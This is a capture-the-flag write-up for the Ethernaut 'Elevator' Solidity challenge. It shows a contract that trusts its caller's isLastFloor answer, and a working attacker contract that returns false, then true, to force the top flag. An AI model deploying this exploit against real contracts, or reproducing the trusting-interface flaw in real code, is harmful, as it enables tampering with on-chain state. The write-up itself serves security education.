# 11. Elevator

This elevator won't let you reach the top of your building. Right?

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## Vulnerability

The vulnerability is quite obvious : `Building building = Building(msg.sender);` makes a strong assumption about the caller.
We can design our own Building smart contract implementing `function isLastFloor(uint) external returns (bool);` but with additional logic to break the elevator contract and reach the top.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract AdversarialBuilding {

    bool alreadyCalled = false;
    address targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;

    }

    function isLastFloor(uint256) external returns (bool) {
        if (alreadyCalled == false) {
            alreadyCalled = true;
            return false;
        }
        return true;
    }

    function attack() public {
        (bool success, ) = targetContract.call(abi.encodeWithSignature("goTo(uint256)", 0));
        require (success == true);
    }
}
```